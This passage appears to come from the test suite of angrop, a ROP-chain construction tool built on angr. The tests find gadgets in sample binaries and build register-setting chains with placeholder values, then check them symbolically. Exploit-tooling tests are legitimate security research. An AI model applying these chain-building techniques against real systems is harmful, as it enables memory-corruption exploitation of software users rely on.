        mov rdx, rax; mov esi, 1; call rbx
        pop rsi; ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(rsi=0x42424242, rdx=0x43434343)
    assert chain is not None

def test_block_effect():
    proj = angr.load_shellcode(
        """
        pop rax
        pop rbx
        ret
        """,
        "amd64",
        load_address=0x400000,
        auto_load_libs=False,
    )
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.find_gadgets_single_threaded(show_progress=False)

    chain = rop.set_regs(rax=0x41414141)
    rb = RopBlock.from_chain(chain)
    data = rb._values[2].ast
    rb._blank_state.solver.add(data == 0x42424242)
    rb._analyze_effect()
    assert not rb.popped_regs

def test_normalized_block_effect():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "libc.so.6"), auto_load_libs=False)
    rop = proj.analyses.ROP(fast_mode=False, only_check_near_rets=False)
    rop.analyze_gadget(0x536408) #: mov r8, r14; mov rsi, r15; call qword ptr [r12 + 0xf0]
    rop.analyze_gadget(0x41f668) #: pop r12; ret
    rop.analyze_gadget(0x0000000000401b96) # pop rdx; ret
    rop.analyze_gadget(0x0000000000422b5a) # pop rdi; ret
    rop.analyze_gadget(0x000000000043cdc9) # mov qword ptr [rdi + 8], rdx; ret
    rop.chain_builder.optimize()

    chain = rop.move_regs(r8='r14', rsi='r15')
    assert chain is not None

def test_stack_offset_infinite_loop():
    cache_path = os.path.join(CACHE_DIR, "libdevel-leak-perl-Leak.so")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv", "libdevel-leak-perl-Leak.so"),
                        auto_load_libs=False, load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1,
                            only_check_near_rets=False, cond_br=True, max_bb_cnt=5)

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets(optimize=False)
        rop.save_gadgets(cache_path)

    addrs = [g.addr for g in rop._all_gadgets]
    assert 0xf30 in addrs

    # if stack_offset is not properly calculated, it may lead to infinite loops
    # when handling 0xf30
    rop.optimize()

def test_normalized_block_effect2():
    cache_path = os.path.join(CACHE_DIR, "riscv_autotalent-autotalent.so")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "riscv", "autotalent-autotalent.so"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1,
                            only_check_near_rets=False, cond_br=True, max_bb_cnt=5)

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets(processes=16, optimize=False)
        rop.save_gadgets(cache_path)

    gs = rop.analyze_addr(0x4ae6)
    g = gs[0]
    rb = rop.chain_builder._reg_setter.normalize_gadget(g)
    assert 'a0' not in rb.popped_regs

def test_normalized_block_with_conditional_branch():
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "aarch64",
                                     "libastring-ocaml-astring.cmxs"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1,
                            only_check_near_rets=False, cond_br=True, max_bb_cnt=5)

    rop.analyze_addr(0x0000000000023d28)
    rop.analyze_addr(0x00000000000189a4)
    rop.analyze_addr(0x0000000000020880)

    rop.chain_builder.optimize()
    chain = rop.set_regs(x0=0x41414141, x5=0x42424242)
    assert chain is not None

def test_jmp_reg_normalize_fast_path():
    cache_path = os.path.join(CACHE_DIR, "mipsel_btrfs-tools_btrfs-calc-size")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "mipsel", "btrfs-tools_btrfs-calc-size"),
                        load_options={'main_opts':{'base_addr': 0}})
    rop = proj.analyses.ROP(fast_mode=False, max_sym_mem_access=1)

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path, optimize=False)
    else:
        rop.find_gadgets(processes=16, optimize=False)
        rop.save_gadgets(cache_path)

    rop.optimize(processes=1)

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    import logging

    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)
    #logging.getLogger("angrop.gadget_analyzer").setLevel(logging.DEBUG)

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```

`tests/test_ropchain.py`:

```py
import os

import angr
import angrop # pylint: disable=unused-import

BIN_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "binaries")
CACHE_DIR = os.path.join(BIN_DIR, 'tests_data', 'angrop_gadgets_cache')

def test_chain_exec():
    """
    Ensure the chain executor is correct
    """
    cache_path = os.path.join(CACHE_DIR, "1after909")
    proj = angr.Project(os.path.join(BIN_DIR, "tests", "x86_64", "1after909"), auto_load_libs=False)
    rop = proj.analyses.ROP()

    if os.path.exists(cache_path):
        rop.load_gadgets(cache_path)
    else:
        rop.find_gadgets()
        rop.save_gadgets(cache_path)

    # make sure the target gadget exist
    gadgets = [x for x in rop._all_gadgets if x.addr == 0x402503]
    assert len(gadgets) == 1
    gadget = gadgets[0]

    # build a ROP chain using the gadget
    chain = angrop.rop_chain.RopChain(proj, rop.chain_builder)
    chain.add_gadget(gadget)
    chain.add_value(0x41414141)

    # make sure the execution succeeds
    state = chain.exec()
    assert not state.regs.rdi.symbolic
    assert state.solver.eval(state.regs.rdi == 0x41414141)

def run_all():
    functions = globals()
    all_functions = {x:y for x, y in functions.items() if x.startswith('test_')}
    for f in sorted(all_functions.keys()):
        if hasattr(all_functions[f], '__call__'):
            all_functions[f]()

if __name__ == "__main__":
    import sys
    import logging

    logging.getLogger("angrop.rop").setLevel(logging.DEBUG)

    if len(sys.argv) > 1:
        globals()['test_' + sys.argv[1]]()
    else:
        run_all()

```